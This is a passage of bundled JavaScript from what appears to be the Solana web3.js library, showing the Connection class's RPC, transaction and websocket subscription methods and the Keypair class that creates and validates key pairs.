          const unsafeRes = await this._rpcRequest('getVersion', []);
          const res = superstruct.create(unsafeRes, jsonRpcResult(VersionResult));
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get version');
          }
          return res.result;
        }
        async getGenesisHash() {
          const unsafeRes = await this._rpcRequest('getGenesisHash', []);
          const res = superstruct.create(unsafeRes, jsonRpcResult(superstruct.string()));
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get genesis hash');
          }
          return res.result;
        }
        async getBlock(slot, rawConfig) {
          const {
            commitment,
            config
          } = extractCommitmentFromConfig(rawConfig);
          const args = this._buildArgsAtLeastConfirmed([slot], commitment, undefined, config);
          const unsafeRes = await this._rpcRequest('getBlock', args);
          const res = superstruct.create(unsafeRes, GetBlockRpcResult);
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get confirmed block');
          }
          const result = res.result;
          if (!result) return result;
          return {
            ...result,
            transactions: result.transactions.map(({
              transaction,
              meta,
              version
            }) => ({
              meta,
              transaction: {
                ...transaction,
                message: versionedMessageFromResponse(version, transaction.message)
              },
              version
            }))
          };
        }
        async getParsedBlock(slot, rawConfig) {
          const {
            commitment,
            config
          } = extractCommitmentFromConfig(rawConfig);
          const args = this._buildArgsAtLeastConfirmed([slot], commitment, 'jsonParsed', config);
          const unsafeRes = await this._rpcRequest('getBlock', args);
          const res = superstruct.create(unsafeRes, GetParsedBlockRpcResult);
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get block');
          }
          return res.result;
        }
        async getBlockHeight(commitmentOrConfig) {
          const {
            commitment,
            config
          } = extractCommitmentFromConfig(commitmentOrConfig);
          const args = this._buildArgs([], commitment, undefined, config);
          const unsafeRes = await this._rpcRequest('getBlockHeight', args);
          const res = superstruct.create(unsafeRes, jsonRpcResult(superstruct.number()));
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get block height information');
          }
          return res.result;
        }
        async getBlockProduction(configOrCommitment) {
          let extra;
          let commitment;
          if (typeof configOrCommitment === 'string') {
            commitment = configOrCommitment;
          } else if (configOrCommitment) {
            const {
              commitment: c,
              ...rest
            } = configOrCommitment;
            commitment = c;
            extra = rest;
          }
          const args = this._buildArgs([], commitment, 'base64', extra);
          const unsafeRes = await this._rpcRequest('getBlockProduction', args);
          const res = superstruct.create(unsafeRes, BlockProductionResponseStruct);
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get block production information');
          }
          return res.result;
        }
        async getTransaction(signature, rawConfig) {
          const {
            commitment,
            config
          } = extractCommitmentFromConfig(rawConfig);
          const args = this._buildArgsAtLeastConfirmed([signature], commitment, undefined, config);
          const unsafeRes = await this._rpcRequest('getTransaction', args);
          const res = superstruct.create(unsafeRes, GetTransactionRpcResult);
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get transaction');
          }
          const result = res.result;
          if (!result) return result;
          return {
            ...result,
            transaction: {
              ...result.transaction,
              message: versionedMessageFromResponse(result.version, result.transaction.message)
            }
          };
        }
        async getParsedTransaction(signature, commitmentOrConfig) {
          const {
            commitment,
            config
          } = extractCommitmentFromConfig(commitmentOrConfig);
          const args = this._buildArgsAtLeastConfirmed([signature], commitment, 'jsonParsed', config);
          const unsafeRes = await this._rpcRequest('getTransaction', args);
          const res = superstruct.create(unsafeRes, GetParsedTransactionRpcResult);
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get transaction');
          }
          return res.result;
        }
        async getParsedTransactions(signatures, commitmentOrConfig) {
          const {
            commitment,
            config
          } = extractCommitmentFromConfig(commitmentOrConfig);
          const batch = signatures.map(signature => {
            const args = this._buildArgsAtLeastConfirmed([signature], commitment, 'jsonParsed', config);
            return {
              methodName: 'getTransaction',
              args
            };
          });
          const unsafeRes = await this._rpcBatchRequest(batch);
          const res = unsafeRes.map(unsafeRes => {
            const res = superstruct.create(unsafeRes, GetParsedTransactionRpcResult);
            if ('error' in res) {
              throw new SolanaJSONRPCError(res.error, 'failed to get transactions');
            }
            return res.result;
          });
          return res;
        }
        async getTransactions(signatures, commitmentOrConfig) {
          const {
            commitment,
            config
          } = extractCommitmentFromConfig(commitmentOrConfig);
          const batch = signatures.map(signature => {
            const args = this._buildArgsAtLeastConfirmed([signature], commitment, undefined, config);
            return {
              methodName: 'getTransaction',
              args
            };
          });
          const unsafeRes = await this._rpcBatchRequest(batch);
          const res = unsafeRes.map(unsafeRes => {
            const res = superstruct.create(unsafeRes, GetTransactionRpcResult);
            if ('error' in res) {
              throw new SolanaJSONRPCError(res.error, 'failed to get transactions');
            }
            const result = res.result;
            if (!result) return result;
            return {
              ...result,
              transaction: {
                ...result.transaction,
                message: versionedMessageFromResponse(result.version, result.transaction.message)
              }
            };
          });
          return res;
        }
        async getConfirmedBlock(slot, commitment) {
          const args = this._buildArgsAtLeastConfirmed([slot], commitment);
          const unsafeRes = await this._rpcRequest('getConfirmedBlock', args);
          const res = superstruct.create(unsafeRes, GetConfirmedBlockRpcResult);
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get confirmed block');
          }
          const result = res.result;
          if (!result) {
            throw new Error('Confirmed block ' + slot + ' not found');
          }
          const block = {
            ...result,
            transactions: result.transactions.map(({
              transaction,
              meta
            }) => {
              const message = new Message(transaction.message);
              return {
                meta,
                transaction: {
                  ...transaction,
                  message
                }
              };
            })
          };
          return {
            ...block,
            transactions: block.transactions.map(({
              transaction,
              meta
            }) => {
              return {
                meta,
                transaction: Transaction.populate(transaction.message, transaction.signatures)
              };
            })
          };
        }
        async getBlocks(startSlot, endSlot, commitment) {
          const args = this._buildArgsAtLeastConfirmed(endSlot !== undefined ? [startSlot, endSlot] : [startSlot], commitment);
          const unsafeRes = await this._rpcRequest('getBlocks', args);
          const res = superstruct.create(unsafeRes, jsonRpcResult(superstruct.array(superstruct.number())));
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get blocks');
          }
          return res.result;
        }
        async getBlockSignatures(slot, commitment) {
          const args = this._buildArgsAtLeastConfirmed([slot], commitment, undefined, {
            transactionDetails: 'signatures',
            rewards: false
          });
          const unsafeRes = await this._rpcRequest('getBlock', args);
          const res = superstruct.create(unsafeRes, GetBlockSignaturesRpcResult);
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get block');
          }
          const result = res.result;
          if (!result) {
            throw new Error('Block ' + slot + ' not found');
          }
          return result;
        }
        async getConfirmedBlockSignatures(slot, commitment) {
          const args = this._buildArgsAtLeastConfirmed([slot], commitment, undefined, {
            transactionDetails: 'signatures',
            rewards: false
          });
          const unsafeRes = await this._rpcRequest('getConfirmedBlock', args);
          const res = superstruct.create(unsafeRes, GetBlockSignaturesRpcResult);
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get confirmed block');
          }
          const result = res.result;
          if (!result) {
            throw new Error('Confirmed block ' + slot + ' not found');
          }
          return result;
        }
        async getConfirmedTransaction(signature, commitment) {
          const args = this._buildArgsAtLeastConfirmed([signature], commitment);
          const unsafeRes = await this._rpcRequest('getConfirmedTransaction', args);
          const res = superstruct.create(unsafeRes, GetTransactionRpcResult);
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get transaction');
          }
          const result = res.result;
          if (!result) return result;
          const message = new Message(result.transaction.message);
          const signatures = result.transaction.signatures;
          return {
            ...result,
            transaction: Transaction.populate(message, signatures)
          };
        }
        async getParsedConfirmedTransaction(signature, commitment) {
          const args = this._buildArgsAtLeastConfirmed([signature], commitment, 'jsonParsed');
          const unsafeRes = await this._rpcRequest('getConfirmedTransaction', args);
          const res = superstruct.create(unsafeRes, GetParsedTransactionRpcResult);
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get confirmed transaction');
          }
          return res.result;
        }
        async getParsedConfirmedTransactions(signatures, commitment) {
          const batch = signatures.map(signature => {
            const args = this._buildArgsAtLeastConfirmed([signature], commitment, 'jsonParsed');
            return {
              methodName: 'getConfirmedTransaction',
              args
            };
          });
          const unsafeRes = await this._rpcBatchRequest(batch);
          const res = unsafeRes.map(unsafeRes => {
            const res = superstruct.create(unsafeRes, GetParsedTransactionRpcResult);
            if ('error' in res) {
              throw new SolanaJSONRPCError(res.error, 'failed to get confirmed transactions');
            }
            return res.result;
          });
          return res;
        }
        async getConfirmedSignaturesForAddress(address, startSlot, endSlot) {
          let options = {};
          let firstAvailableBlock = await this.getFirstAvailableBlock();
          while (!('until' in options)) {
            startSlot--;
            if (startSlot <= 0 || startSlot < firstAvailableBlock) {
              break;
            }
            try {
              const block = await this.getConfirmedBlockSignatures(startSlot, 'finalized');
              if (block.signatures.length > 0) {
                options.until = block.signatures[block.signatures.length - 1].toString();
              }
            } catch (err) {
              if (err instanceof Error && err.message.includes('skipped')) {
                continue;
              } else {
                throw err;
              }
            }
          }
          let highestConfirmedRoot = await this.getSlot('finalized');
          while (!('before' in options)) {
            endSlot++;
            if (endSlot > highestConfirmedRoot) {
              break;
            }
            try {
              const block = await this.getConfirmedBlockSignatures(endSlot);
              if (block.signatures.length > 0) {
                options.before = block.signatures[block.signatures.length - 1].toString();
              }
            } catch (err) {
              if (err instanceof Error && err.message.includes('skipped')) {
                continue;
              } else {
                throw err;
              }
            }
          }
          const confirmedSignatureInfo = await this.getConfirmedSignaturesForAddress2(address, options);
          return confirmedSignatureInfo.map(info => info.signature);
        }
        async getConfirmedSignaturesForAddress2(address, options, commitment) {
          const args = this._buildArgsAtLeastConfirmed([address.toBase58()], commitment, undefined, options);
          const unsafeRes = await this._rpcRequest('getConfirmedSignaturesForAddress2', args);
          const res = superstruct.create(unsafeRes, GetConfirmedSignaturesForAddress2RpcResult);
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get confirmed signatures for address');
          }
          return res.result;
        }
        async getSignaturesForAddress(address, options, commitment) {
          const args = this._buildArgsAtLeastConfirmed([address.toBase58()], commitment, undefined, options);
          const unsafeRes = await this._rpcRequest('getSignaturesForAddress', args);
          const res = superstruct.create(unsafeRes, GetSignaturesForAddressRpcResult);
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, 'failed to get signatures for address');
          }
          return res.result;
        }
        async getAddressLookupTable(accountKey, config) {
          const {
            context,
            value: accountInfo
          } = await this.getAccountInfoAndContext(accountKey, config);
          let value = null;
          if (accountInfo !== null) {
            value = new AddressLookupTableAccount({
              key: accountKey,
              state: AddressLookupTableAccount.deserialize(accountInfo.data)
            });
          }
          return {
            context,
            value
          };
        }
        async getNonceAndContext(nonceAccount, commitment) {
          const {
            context,
            value: accountInfo
          } = await this.getAccountInfoAndContext(nonceAccount, commitment);
          let value = null;
          if (accountInfo !== null) {
            value = NonceAccount.fromAccountData(accountInfo.data);
          }
          return {
            context,
            value
          };
        }
        async getNonce(nonceAccount, commitment) {
          return await this.getNonceAndContext(nonceAccount, commitment).then(x => x.value).catch(e => {
            throw new Error('failed to get nonce for account ' + nonceAccount.toBase58() + ': ' + e);
          });
        }
        async requestAirdrop(to, lamports) {
          const unsafeRes = await this._rpcRequest('requestAirdrop', [to.toBase58(), lamports]);
          const res = superstruct.create(unsafeRes, RequestAirdropRpcResult);
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, `airdrop to ${to.toBase58()} failed`);
          }
          return res.result;
        }
        async _blockhashWithExpiryBlockHeight(disableCache) {
          if (!disableCache) {
            while (this._pollingBlockhash) {
              await sleep(100);
            }
            const timeSinceFetch = Date.now() - this._blockhashInfo.lastFetch;
            const expired = timeSinceFetch >= BLOCKHASH_CACHE_TIMEOUT_MS;
            if (this._blockhashInfo.latestBlockhash !== null && !expired) {
              return this._blockhashInfo.latestBlockhash;
            }
          }
          return await this._pollNewBlockhash();
        }
        async _pollNewBlockhash() {
          this._pollingBlockhash = true;
          try {
            const startTime = Date.now();
            const cachedLatestBlockhash = this._blockhashInfo.latestBlockhash;
            const cachedBlockhash = cachedLatestBlockhash ? cachedLatestBlockhash.blockhash : null;
            for (let i = 0; i < 50; i++) {
              const latestBlockhash = await this.getLatestBlockhash('finalized');
              if (cachedBlockhash !== latestBlockhash.blockhash) {
                this._blockhashInfo = {
                  latestBlockhash,
                  lastFetch: Date.now(),
                  transactionSignatures: [],
                  simulatedSignatures: []
                };
                return latestBlockhash;
              }
              await sleep(MS_PER_SLOT / 2);
            }
            throw new Error(`Unable to obtain a new blockhash after ${Date.now() - startTime}ms`);
          } finally {
            this._pollingBlockhash = false;
          }
        }
        async getStakeMinimumDelegation(config) {
          const {
            commitment,
            config: configArg
          } = extractCommitmentFromConfig(config);
          const args = this._buildArgs([], commitment, 'base64', configArg);
          const unsafeRes = await this._rpcRequest('getStakeMinimumDelegation', args);
          const res = superstruct.create(unsafeRes, jsonRpcResultAndContext(superstruct.number()));
          if ('error' in res) {
            throw new SolanaJSONRPCError(res.error, `failed to get stake minimum delegation`);
          }
          return res.result;
        }
        async simulateTransaction(transactionOrMessage, configOrSigners, includeAccounts) {
          if ('message' in transactionOrMessage) {
            const versionedTx = transactionOrMessage;
            const wireTransaction = versionedTx.serialize();
            const encodedTransaction = buffer.Buffer.from(wireTransaction).toString('base64');
            if (Array.isArray(configOrSigners) || includeAccounts !== undefined) {
              throw new Error('Invalid arguments');
            }
            const config = configOrSigners || {};
            config.encoding = 'base64';
            if (!('commitment' in config)) {
              config.commitment = this.commitment;
            }
            const args = [encodedTransaction, config];
            const unsafeRes = await this._rpcRequest('simulateTransaction', args);
            const res = superstruct.create(unsafeRes, SimulatedTransactionResponseStruct);
            if ('error' in res) {
              throw new Error('failed to simulate transaction: ' + res.error.message);
            }
            return res.result;
          }
          let transaction;
          if (transactionOrMessage instanceof Transaction) {
            let originalTx = transactionOrMessage;
            transaction = new Transaction();
            transaction.feePayer = originalTx.feePayer;
            transaction.instructions = transactionOrMessage.instructions;
            transaction.nonceInfo = originalTx.nonceInfo;
            transaction.signatures = originalTx.signatures;
          } else {
            transaction = Transaction.populate(transactionOrMessage);
            transaction._message = transaction._json = undefined;
          }
          if (configOrSigners !== undefined && !Array.isArray(configOrSigners)) {
            throw new Error('Invalid arguments');
          }
          const signers = configOrSigners;
          if (transaction.nonceInfo && signers) {
            transaction.sign(...signers);
          } else {
            let disableCache = this._disableBlockhashCaching;
            for (;;) {
              const latestBlockhash = await this._blockhashWithExpiryBlockHeight(disableCache);
              transaction.lastValidBlockHeight = latestBlockhash.lastValidBlockHeight;
              transaction.recentBlockhash = latestBlockhash.blockhash;
              if (!signers) break;
              transaction.sign(...signers);
              if (!transaction.signature) {
                throw new Error('!signature');
              }
              const signature = transaction.signature.toString('base64');
              if (!this._blockhashInfo.simulatedSignatures.includes(signature) && !this._blockhashInfo.transactionSignatures.includes(signature)) {
                this._blockhashInfo.simulatedSignatures.push(signature);
                break;
              } else {
                disableCache = true;
              }
            }
          }
          const message = transaction._compile();
          const signData = message.serialize();
          const wireTransaction = transaction._serialize(signData);
          const encodedTransaction = wireTransaction.toString('base64');
          const config = {
            encoding: 'base64',
            commitment: this.commitment
          };
          if (includeAccounts) {
            const addresses = (Array.isArray(includeAccounts) ? includeAccounts : message.nonProgramIds()).map(key => key.toBase58());
            config['accounts'] = {
              encoding: 'base64',
              addresses
            };
          }
          if (signers) {
            config.sigVerify = true;
          }
          const args = [encodedTransaction, config];
          const unsafeRes = await this._rpcRequest('simulateTransaction', args);
          const res = superstruct.create(unsafeRes, SimulatedTransactionResponseStruct);
          if ('error' in res) {
            let logs;
            if ('data' in res.error) {
              logs = res.error.data.logs;
              if (logs && Array.isArray(logs)) {
                const traceIndent = '\n    ';
                const logTrace = traceIndent + logs.join(traceIndent);
                console.error(res.error.message, logTrace);
              }
            }
            throw new SendTransactionError('failed to simulate transaction: ' + res.error.message, logs);
          }
          return res.result;
        }
        async sendTransaction(transaction, signersOrOptions, options) {
          if ('version' in transaction) {
            if (signersOrOptions && Array.isArray(signersOrOptions)) {
              throw new Error('Invalid arguments');
            }
            const wireTransaction = transaction.serialize();
            return await this.sendRawTransaction(wireTransaction, options);
          }
          if (signersOrOptions === undefined || !Array.isArray(signersOrOptions)) {
            throw new Error('Invalid arguments');
          }
          const signers = signersOrOptions;
          if (transaction.nonceInfo) {
            transaction.sign(...signers);
          } else {
            let disableCache = this._disableBlockhashCaching;
            for (;;) {
              const latestBlockhash = await this._blockhashWithExpiryBlockHeight(disableCache);
              transaction.lastValidBlockHeight = latestBlockhash.lastValidBlockHeight;
              transaction.recentBlockhash = latestBlockhash.blockhash;
              transaction.sign(...signers);
              if (!transaction.signature) {
                throw new Error('!signature');
              }
              const signature = transaction.signature.toString('base64');
              if (!this._blockhashInfo.transactionSignatures.includes(signature)) {
                this._blockhashInfo.transactionSignatures.push(signature);
                break;
              } else {
                disableCache = true;
              }
            }
          }
          const wireTransaction = transaction.serialize();
          return await this.sendRawTransaction(wireTransaction, options);
        }
        async sendRawTransaction(rawTransaction, options) {
          const encodedTransaction = toBuffer(rawTransaction).toString('base64');
          const result = await this.sendEncodedTransaction(encodedTransaction, options);
          return result;
        }
        async sendEncodedTransaction(encodedTransaction, options) {
          const config = {
            encoding: 'base64'
          };
          const skipPreflight = options && options.skipPreflight;
          const preflightCommitment = options && options.preflightCommitment || this.commitment;
          if (options && options.maxRetries != null) {
            config.maxRetries = options.maxRetries;
          }
          if (options && options.minContextSlot != null) {
            config.minContextSlot = options.minContextSlot;
          }
          if (skipPreflight) {
            config.skipPreflight = skipPreflight;
          }
          if (preflightCommitment) {
            config.preflightCommitment = preflightCommitment;
          }
          const args = [encodedTransaction, config];
          const unsafeRes = await this._rpcRequest('sendTransaction', args);
          const res = superstruct.create(unsafeRes, SendTransactionRpcResult);
          if ('error' in res) {
            let logs;
            if ('data' in res.error) {
              logs = res.error.data.logs;
            }
            throw new SendTransactionError('failed to send transaction: ' + res.error.message, logs);
          }
          return res.result;
        }
        _wsOnOpen() {
          this._rpcWebSocketConnected = true;
          this._rpcWebSocketHeartbeat = setInterval(() => {
            this._rpcWebSocket.notify('ping').catch(() => {});
          }, 5000);
          this._updateSubscriptions();
        }
        _wsOnError(err) {
          this._rpcWebSocketConnected = false;
          console.error('ws error:', err.message);
        }
        _wsOnClose(code) {
          this._rpcWebSocketConnected = false;
          this._rpcWebSocketGeneration = (this._rpcWebSocketGeneration + 1) % Number.MAX_SAFE_INTEGER;
          if (this._rpcWebSocketIdleTimeout) {
            clearTimeout(this._rpcWebSocketIdleTimeout);
            this._rpcWebSocketIdleTimeout = null;
          }
          if (this._rpcWebSocketHeartbeat) {
            clearInterval(this._rpcWebSocketHeartbeat);
            this._rpcWebSocketHeartbeat = null;
          }
          if (code === 1000) {
            this._updateSubscriptions();
            return;
          }
          this._subscriptionCallbacksByServerSubscriptionId = {};
          Object.entries(this._subscriptionsByHash).forEach(([hash, subscription]) => {
            this._subscriptionsByHash[hash] = {
              ...subscription,
              state: 'pending'
            };
          });
        }
        async _updateSubscriptions() {
          if (Object.keys(this._subscriptionsByHash).length === 0) {
            if (this._rpcWebSocketConnected) {
              this._rpcWebSocketConnected = false;
              this._rpcWebSocketIdleTimeout = setTimeout(() => {
                this._rpcWebSocketIdleTimeout = null;
                try {
                  this._rpcWebSocket.close();
                } catch (err) {
                  if (err instanceof Error) {
                    console.log(`Error when closing socket connection: ${err.message}`);
                  }
                }
              }, 500);
            }
            return;
          }
          if (this._rpcWebSocketIdleTimeout !== null) {
            clearTimeout(this._rpcWebSocketIdleTimeout);
            this._rpcWebSocketIdleTimeout = null;
            this._rpcWebSocketConnected = true;
          }
          if (!this._rpcWebSocketConnected) {
            this._rpcWebSocket.connect();
            return;
          }
          const activeWebSocketGeneration = this._rpcWebSocketGeneration;
          const isCurrentConnectionStillActive = () => {
            return activeWebSocketGeneration === this._rpcWebSocketGeneration;
          };
          await Promise.all(Object.keys(this._subscriptionsByHash).map(async hash => {
            const subscription = this._subscriptionsByHash[hash];
            if (subscription === undefined) {
              return;
            }
            switch (subscription.state) {
              case 'pending':
              case 'unsubscribed':
                if (subscription.callbacks.size === 0) {
                  delete this._subscriptionsByHash[hash];
                  if (subscription.state === 'unsubscribed') {
                    delete this._subscriptionCallbacksByServerSubscriptionId[subscription.serverSubscriptionId];
                  }
                  await this._updateSubscriptions();
                  return;
                }
                await (async () => {
                  const {
                    args,
                    method
                  } = subscription;
                  try {
                    this._subscriptionsByHash[hash] = {
                      ...subscription,
                      state: 'subscribing'
                    };
                    const serverSubscriptionId = await this._rpcWebSocket.call(method, args);
                    this._subscriptionsByHash[hash] = {
                      ...subscription,
                      serverSubscriptionId,
                      state: 'subscribed'
                    };
                    this._subscriptionCallbacksByServerSubscriptionId[serverSubscriptionId] = subscription.callbacks;
                    await this._updateSubscriptions();
                  } catch (e) {
                    if (e instanceof Error) {
                      console.error(`${method} error for argument`, args, e.message);
                    }
                    if (!isCurrentConnectionStillActive()) {
                      return;
                    }
                    this._subscriptionsByHash[hash] = {
                      ...subscription,
                      state: 'pending'
                    };
                    await this._updateSubscriptions();
                  }
                })();
                break;
              case 'subscribed':
                if (subscription.callbacks.size === 0) {
                  await (async () => {
                    const {
                      serverSubscriptionId,
                      unsubscribeMethod
                    } = subscription;
                    if (this._subscriptionsAutoDisposedByRpc.has(serverSubscriptionId)) {
                      this._subscriptionsAutoDisposedByRpc.delete(serverSubscriptionId);
                    } else {
                      this._subscriptionsByHash[hash] = {
                        ...subscription,
                        state: 'unsubscribing'
                      };
                      try {
                        await this._rpcWebSocket.call(unsubscribeMethod, [serverSubscriptionId]);
                      } catch (e) {
                        if (e instanceof Error) {
                          console.error(`${unsubscribeMethod} error:`, e.message);
                        }
                        if (!isCurrentConnectionStillActive()) {
                          return;
                        }
                        this._subscriptionsByHash[hash] = {
                          ...subscription,
                          state: 'subscribed'
                        };
                        await this._updateSubscriptions();
                        return;
                      }
                    }
                    this._subscriptionsByHash[hash] = {
                      ...subscription,
                      state: 'unsubscribed'
                    };
                    await this._updateSubscriptions();
                  })();
                }
                break;
            }
          }));
        }
        _handleServerNotification(serverSubscriptionId, callbackArgs) {
          const callbacks = this._subscriptionCallbacksByServerSubscriptionId[serverSubscriptionId];
          if (callbacks === undefined) {
            return;
          }
          callbacks.forEach(cb => {
            try {
              cb(...callbackArgs);
            } catch (e) {
              console.error(e);
            }
          });
        }
        _wsOnAccountNotification(notification) {
          const {
            result,
            subscription
          } = superstruct.create(notification, AccountNotificationResult);
          this._handleServerNotification(subscription, [result.value, result.context]);
        }
        _makeSubscription(subscriptionConfig, args) {
          const clientSubscriptionId = this._nextClientSubscriptionId++;
          const hash = fastStableStringify$1([subscriptionConfig.method, args], true);
          const existingSubscription = this._subscriptionsByHash[hash];
          if (existingSubscription === undefined) {
            this._subscriptionsByHash[hash] = {
              ...subscriptionConfig,
              args,
              callbacks: new Set([subscriptionConfig.callback]),
              state: 'pending'
            };
          } else {
            existingSubscription.callbacks.add(subscriptionConfig.callback);
          }
          this._subscriptionDisposeFunctionsByClientSubscriptionId[clientSubscriptionId] = async () => {
            delete this._subscriptionDisposeFunctionsByClientSubscriptionId[clientSubscriptionId];
            const subscription = this._subscriptionsByHash[hash];
            assert(subscription !== undefined, `Could not find a \`Subscription\` when tearing down client subscription #${clientSubscriptionId}`);
            subscription.callbacks.delete(subscriptionConfig.callback);
            await this._updateSubscriptions();
          };
          this._updateSubscriptions();
          return clientSubscriptionId;
        }
        onAccountChange(publicKey, callback, commitment) {
          const args = this._buildArgs([publicKey.toBase58()], commitment || this._commitment || 'finalized', 'base64');
          return this._makeSubscription({
            callback,
            method: 'accountSubscribe',
            unsubscribeMethod: 'accountUnsubscribe'
          }, args);
        }
        async removeAccountChangeListener(clientSubscriptionId) {
          await this._unsubscribeClientSubscription(clientSubscriptionId, 'account change');
        }
        _wsOnProgramAccountNotification(notification) {
          const {
            result,
            subscription
          } = superstruct.create(notification, ProgramAccountNotificationResult);
          this._handleServerNotification(subscription, [{
            accountId: result.value.pubkey,
            accountInfo: result.value.account
          }, result.context]);
        }
        onProgramAccountChange(programId, callback, commitment, filters) {
          const args = this._buildArgs([programId.toBase58()], commitment || this._commitment || 'finalized', 'base64', filters ? {
            filters: filters
          } : undefined);
          return this._makeSubscription({
            callback,
            method: 'programSubscribe',
            unsubscribeMethod: 'programUnsubscribe'
          }, args);
        }
        async removeProgramAccountChangeListener(clientSubscriptionId) {
          await this._unsubscribeClientSubscription(clientSubscriptionId, 'program account change');
        }
        onLogs(filter, callback, commitment) {
          const args = this._buildArgs([typeof filter === 'object' ? {
            mentions: [filter.toString()]
          } : filter], commitment || this._commitment || 'finalized');
          return this._makeSubscription({
            callback,
            method: 'logsSubscribe',
            unsubscribeMethod: 'logsUnsubscribe'
          }, args);
        }
        async removeOnLogsListener(clientSubscriptionId) {
          await this._unsubscribeClientSubscription(clientSubscriptionId, 'logs');
        }
        _wsOnLogsNotification(notification) {
          const {
            result,
            subscription
          } = superstruct.create(notification, LogsNotificationResult);
          this._handleServerNotification(subscription, [result.value, result.context]);
        }
        _wsOnSlotNotification(notification) {
          const {
            result,
            subscription
          } = superstruct.create(notification, SlotNotificationResult);
          this._handleServerNotification(subscription, [result]);
        }
        onSlotChange(callback) {
          return this._makeSubscription({
            callback,
            method: 'slotSubscribe',
            unsubscribeMethod: 'slotUnsubscribe'
          }, []);
        }
        async removeSlotChangeListener(clientSubscriptionId) {
          await this._unsubscribeClientSubscription(clientSubscriptionId, 'slot change');
        }
        _wsOnSlotUpdatesNotification(notification) {
          const {
            result,
            subscription
          } = superstruct.create(notification, SlotUpdateNotificationResult);
          this._handleServerNotification(subscription, [result]);
        }
        onSlotUpdate(callback) {
          return this._makeSubscription({
            callback,
            method: 'slotsUpdatesSubscribe',
            unsubscribeMethod: 'slotsUpdatesUnsubscribe'
          }, []);
        }
        async removeSlotUpdateListener(clientSubscriptionId) {
          await this._unsubscribeClientSubscription(clientSubscriptionId, 'slot update');
        }
        async _unsubscribeClientSubscription(clientSubscriptionId, subscriptionName) {
          const dispose = this._subscriptionDisposeFunctionsByClientSubscriptionId[clientSubscriptionId];
          if (dispose) {
            await dispose();
          } else {
            console.warn('Ignored unsubscribe request because an active subscription with id ' + `\`${clientSubscriptionId}\` for '${subscriptionName}' events ` + 'could not be found.');
          }
        }
        _buildArgs(args, override, encoding, extra) {
          const commitment = override || this._commitment;
          if (commitment || encoding || extra) {
            let options = {};
            if (encoding) {
              options.encoding = encoding;
            }
            if (commitment) {
              options.commitment = commitment;
            }
            if (extra) {
              options = Object.assign(options, extra);
            }
            args.push(options);
          }
          return args;
        }
        _buildArgsAtLeastConfirmed(args, override, encoding, extra) {
          const commitment = override || this._commitment;
          if (commitment && !['confirmed', 'finalized'].includes(commitment)) {
            throw new Error('Using Connection with default commitment: `' + this._commitment + '`, but method requires at least `confirmed`');
          }
          return this._buildArgs(args, override, encoding, extra);
        }
        _wsOnSignatureNotification(notification) {
          const {
            result,
            subscription
          } = superstruct.create(notification, SignatureNotificationResult);
          if (result.value !== 'receivedSignature') {
            this._subscriptionsAutoDisposedByRpc.add(subscription);
          }
          this._handleServerNotification(subscription, result.value === 'receivedSignature' ? [{
            type: 'received'
          }, result.context] : [{
            type: 'status',
            result: result.value
          }, result.context]);
        }
        onSignature(signature, callback, commitment) {
          const args = this._buildArgs([signature], commitment || this._commitment || 'finalized');
          const clientSubscriptionId = this._makeSubscription({
            callback: (notification, context) => {
              if (notification.type === 'status') {
                callback(notification.result, context);
                try {
                  this.removeSignatureListener(clientSubscriptionId);
                } catch (_err) {}
              }
            },
            method: 'signatureSubscribe',
            unsubscribeMethod: 'signatureUnsubscribe'
          }, args);
          return clientSubscriptionId;
        }
        onSignatureWithOptions(signature, callback, options) {
          const {
            commitment,
            ...extra
          } = {
            ...options,
            commitment: options && options.commitment || this._commitment || 'finalized'
          };
          const args = this._buildArgs([signature], commitment, undefined, extra);
          const clientSubscriptionId = this._makeSubscription({
            callback: (notification, context) => {
              callback(notification, context);
              try {
                this.removeSignatureListener(clientSubscriptionId);
              } catch (_err) {}
            },
            method: 'signatureSubscribe',
            unsubscribeMethod: 'signatureUnsubscribe'
          }, args);
          return clientSubscriptionId;
        }
        async removeSignatureListener(clientSubscriptionId) {
          await this._unsubscribeClientSubscription(clientSubscriptionId, 'signature result');
        }
        _wsOnRootNotification(notification) {
          const {
            result,
            subscription
          } = superstruct.create(notification, RootNotificationResult);
          this._handleServerNotification(subscription, [result]);
        }
        onRootChange(callback) {
          return this._makeSubscription({
            callback,
            method: 'rootSubscribe',
            unsubscribeMethod: 'rootUnsubscribe'
          }, []);
        }
        async removeRootChangeListener(clientSubscriptionId) {
          await this._unsubscribeClientSubscription(clientSubscriptionId, 'root change');
        }
      }
      class Keypair {
        constructor(keypair) {
          this._keypair = void 0;
          this._keypair = keypair !== null && keypair !== void 0 ? keypair : generateKeypair();
        }
        static generate() {
          return new Keypair(generateKeypair());
        }
        static fromSecretKey(secretKey, options) {
          if (secretKey.byteLength !== 64) {
            throw new Error('bad secret key size');
          }
          const publicKey = secretKey.slice(32, 64);
          if (!options || !options.skipValidation) {
            const privateScalar = secretKey.slice(0, 32);
            const computedPublicKey = getPublicKey(privateScalar);
            for (let ii = 0; ii < 32; ii++) {
              if (publicKey[ii] !== computedPublicKey[ii]) {
                throw new Error('provided secretKey is invalid');
              }
            }
          }
          return new Keypair({
            publicKey,
            secretKey
          });
        }
        static fromSeed(seed) {
          const publicKey = getPublicKey(seed);
          const secretKey = new Uint8Array(64);
          secretKey.set(seed);
          secretKey.set(publicKey, 32);
          return new Keypair({
            publicKey,
            secretKey
          });
        }
        get publicKey() {
          return new PublicKey(this._keypair.publicKey);
        }
        get secretKey() {
          return new Uint8Array(this._keypair.secretKey);
        }
      }
